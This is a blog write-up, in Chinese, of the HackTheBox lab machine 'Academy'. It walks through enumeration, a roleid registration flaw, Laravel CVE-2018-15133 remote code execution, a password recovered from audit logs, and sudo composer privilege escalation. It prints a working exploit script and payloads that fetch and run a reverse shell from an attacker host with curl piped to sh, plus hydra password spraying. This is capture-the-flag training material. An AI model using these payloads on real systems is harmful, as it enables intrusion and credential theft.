---
layout: post
title: "HackTheBox Academy Write-up"
subtitle: ""
date: 2026-10-05
author: "Peter"
header-img: "img/post-bg-hack.jpg"
tags: [資安, writeup, hackthebox]
---

大家好，這篇是關於 HTB 靶機 Academy 的 Write-up，與 HackTheBox Academy 無關。

題目: [https://app.hackthebox.com/machines/Academy](https://app.hackthebox.com/machines/Academy)

## Nmap Scan

首先我們跑 nmap，可以發現有三個 port 是 open 的，分別是 22, 80, 33060。

```bash
sudo nmap -sC -sV -vvv -p- -oN nmap/all-ports.nmap 10.129.49.48
```

![image-20261002170049199](/img/in-post/htb-academy/image-20261002170049199.png)

透過 nmap 結果，與 ssh 版本反查，可以得知下列資訊：

- 系統: Ubuntu 20.04 LTS (Focal Fossa)
- Web Server: Apache httpd 2.4.41
- Database MySQL

接著我們進入網站進行進一步的 Enum。

## Web#1

在存取 ip 時，會發現被轉到 `academy.htb` 這時我們修改 `/etc/hosts` 使網頁得以正常存取。

![image-20261002170559747](/img/in-post/htb-academy/image-20261002170559747.png)

```bash
sudo vim /etc/hosts
```

![image-20261002170713019](/img/in-post/htb-academy/image-20261002170713019.png)

修改後，我們即可存取網頁。

![image-20261002170810480](/img/in-post/htb-academy/image-20261002170810480.png)

在把網站裡面的東西摸過一輪後，肉眼可見的有三個網站，他們的功能分別如下：

- /login.php: 登入
- /register.php: 註冊
- / :無功能

經過這個階段的測試，我們可以透過網站註冊任意的帳號與密碼，登入後可以進入用戶名稱為 `egre55` 的頁面。

![image-20261002171023486](/img/in-post/htb-academy/image-20261002171023486.png)

但我們在這個頁面並沒有看到可以被攻擊的標的，但在進行 enum 的過程中，我們在 burp 看到註冊時的 post request 內有包含 `roleid`，這可能是可以更改的東西。

![image-20261002171218851](/img/in-post/htb-academy/image-20261002171218851.png)

我們將 roleid 進行更改並登入 `login.php` 並沒有發現與原本有任何差異。由於情報量不足，我們使用 `gobuster` 進行 directory fuzzing。

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,pdf,txt -u http://academy.htb/ -o gobuster/80-common -t 50
```

透過結果我們可以看到搜尋到了 `admin.php`，同樣是一個登入頁面。

![image-20261002171717664](/img/in-post/htb-academy/image-20261002171717664.png)

![image-20261002171734194](/img/in-post/htb-academy/image-20261002171734194.png)

這時我們利用先前 `roleid` 改為 1 的帳號進行登入，發現可以正常登入。

![image-20261002171846619](/img/in-post/htb-academy/image-20261002171846619.png)

登入後得到情報如下：

- 兩個 username: cry0l1t3 / mrb3n
- 一個 subdomain: dev-staging-01.academy.htb

我們再度修改 `/etc/hosts` 即可進入 `dev-staging-01.academy.htb` 。

## Web#2

進入後，發現是一個 laravel 的除錯頁面。

![image-20261002172021208](/img/in-post/htb-academy/image-20261002172021208.png)

透過瀏覽頁面，我們可以得到的情報與可以做出的假設如下：

1. 內網跑著 mysql 與 smtp
2. Environment Variable 有一個 base64 的 APP_KEY 不知道是什麼東西
3. Laravel 漏洞很多，可能可以從 laravel 的漏洞攻擊

我們把關鍵字輸入 google 後，AI 摘要告訴我們可以瞧瞧 `CVE-2018-15133`

![image-20261002173226501](/img/in-post/htb-academy/image-20261002173226501.png)

進入 PoC 的頁面，可以看到標題符合我們找到的資料。執行 readme 內的指令後，即可成功達成 RCE。

![image-20261002173343208](/img/in-post/htb-academy/image-20261002173343208.png)

為了方便，整理成腳本如下：

```bash
#/bin/bash
#payload: msfvenom -p cmd/unix/reverse_bash LHOST=10.10.15.126 LPORT=8000 -f raw -o shell.sh
payload="curl 10.10.15.126/shell.sh | sh"
appkey="dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
b64payload=$(/home/kali/machines/academy/exploits/phpggc/phpggc Laravel/RCE1 system "$payload" -b)
token=$(/home/kali/machines/academy/exploits/laravel-poc-cve-2018-15133/cve-2018-15133.php $appkey $b64payload | awk 'NR==4 {print $2}')
curl http://dev-staging-01.academy.htb/ -X POST -H "X-XSRF-TOKEN: $token"
```

將檔案建立好並透過 `python3 -m http.server 80` 架設伺服器與透過 `nc -lvnp 8000` 聆聽後，即可成功取得 web shell。

![image-20261002173822530](/img/in-post/htb-academy/image-20261002173822530.png)

## Web Shell: www-data

取得 web shell 後，我們進行 shell upgrade 如下：

```bash
python3 -c "import pty;pty.spawn('/bin/bash');"
# ctrl + z
stty raw -echo; fg
```

![image-20261005131904104](/img/in-post/htb-academy/image-20261005131904104.png)

在 `/var/www/html` 內進行一陣 enum 後，我們可以在 `/var/www/html/academy/.env` 內發現一組密碼。

> 如果用 linpeas.sh 的話可以直接把 .env 的內容顯示出來

![image-20261005132201590](/img/in-post/htb-academy/image-20261005132201590.png)

由於我們不知道這組密碼的對象為何，我們使用 hydra 進行嘗試，可以發現是 `cry0l1t3` 的密碼，隨即用 ssh 登入後即可拿到 userflag。

```bash
# (target) 擷取 username 並複製
cat /etc/passwd | tail -n 6 | cut -d ':' -f 1
# (attack) 進行 ssh enum
hydra -L users -p 'mySup3rP4s5w0rd!!' -t 4 -f ssh://academy.htb
```

![image-20261005132832478](/img/in-post/htb-academy/image-20261005132832478.png)

![image-20261005132856297](/img/in-post/htb-academy/image-20261005132856297.png)

## Privesc: cry0l1t3

在看用戶的 id 的時候，我們發現用戶加入了 `adm` group 中，所謂 adm 是：

> Linux 中的 **`adm` 群組**是一個預設的系統群組，主要用於**系統監控和查看日誌檔案**。
>
> - **讀取日誌**：群組成員可以讀取 `/var/log` 目錄底下的許多系統日誌檔案（例如 `syslog`、`auth.log` 等），不需要擁有 `root` 完整權限。
> - **系統工具**：允許使用某些系統監控或診斷工具（例如 `xconsole`）。
> - **安全性設計**：這是一個權限受限的群組，主要為了方便讓特定維護人員或監控程式檢視記錄，而不需要直接暴露管理者（root）密碼。

簡單來說，我們可以用 `journalctl` `aureport` `ausearch` 等工具查看 `/var/log` 下面的所有內容。

同時，我們使用 `linpeas.sh` 進行 enum，可以看到一些有趣的結果如下：

![image-20261005135425101](/img/in-post/htb-academy/image-20261005135425101.png)

也就是說，tty log 中的 su 可能有包含了密碼。我們將該字串進行 hex decode 後即可得到用戶密碼 `mrb3n_Ac@d3my!`。

```
echo '6D7262336E5F41634064336D79210A' | xxd -p -r
```

![image-20261005135733736](/img/in-post/htb-academy/image-20261005135733736.png)

> 如果只是要確認 audit log 中關於 tty 的內容，也可以使用 `aureport --tty` 進行確認。

## privesc: mrb3n

![image-20261005135924184](/img/in-post/htb-academy/image-20261005135924184.png)

使用 ssh 取得 shell 後，我們需要進一步地進行 privesc 至 root。使用 `sudo -l` 確認 suid 後，我們即可確認用戶可執行 `/usr/bin/composer`，而透過搜尋 gtfobins ，我們可以得知這得以使我們取得 root shell。

![image-20261005140357253](/img/in-post/htb-academy/image-20261005140357253.png)

修改 payload 並執行後，即可取得 root shell。

```bash
echo '{"scripts":{"x":"curl 10.10.15.126/shell.sh | bash"}}' >composer.json
sudo composer run-script x
```

![image-20261005140748918](/img/in-post/htb-academy/image-20261005140748918.png)

到此階段即可取得 root.txt。

## 補充

1. laravel 的 exploit 很多，需要逐一嘗試，關鍵在找到 app_key 這個關鍵字。
2. 把 payload 串起來到一個 shell script 是很好的實踐，可以省很多時間。
3. `linpeas.sh` 要看得仔細一點，相對起其他如 `lse.sh` ， linpeas 還是比較全面。
4. 在取得 webshell 的階段，可以先用 php shell ，進去之後做大致上的環境確認後再轉移至 bash shell。
